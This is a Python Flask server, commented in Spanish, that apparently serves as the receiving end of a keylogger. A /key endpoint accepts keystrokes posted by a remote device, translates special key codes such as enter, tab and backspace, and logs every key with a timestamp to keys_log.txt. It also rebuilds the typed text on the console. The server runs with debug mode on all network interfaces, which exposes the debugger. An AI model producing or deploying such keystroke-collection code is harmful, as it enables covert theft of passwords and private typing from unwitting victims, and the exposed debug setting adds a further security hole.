from flask import Flask, request, jsonify
import datetime
import os

app = Flask(__name__)

# Variables globales
buffer = []
logs = []

# Diccionario de reemplazos para teclas especiales
SPECIAL_KEYS = {
    " ": "[space]",
    "176": "[enter]",
    "179": "[tab]",
    "178": "[backspace]",
    "193": "[BloqMayus]",
    "177": "[Esc]",
    "GUI": "[Win]"
}

def translate_key(key):
    """Convierte una tecla especial en texto visible."""
    return SPECIAL_KEYS.get(key, key)


@app.route('/key', methods=['POST'])
def receive_key():
    global buffer, logs
    data = request.get_json()

    if not data or 'key' not in data:
        return jsonify({"error": "Formato inválido"}), 400

    key = data['key']
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Traduce la tecla si es especial
    display_key = translate_key(key)

    # Guardar en archivo
    with open("keys_log.txt", "a", encoding="utf-8") as f:
        f.write(f"[{timestamp}] {display_key}\n")

    # Guardar en memoria
    logs.append(f"[{timestamp}] {display_key}")
    buffer.append(display_key)

    # Limpiar consola
    os.system("cls" if os.name == "nt" else "clear")

    # Mostrar logs
    for line in logs:
        print(line)

    print("-" * 25)

    # Mostrar reconstrucción
    print("".join(buffer))

    print("-" * 25)

    return jsonify({"status": "ok", "key": key}), 200


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5555, debug=True)
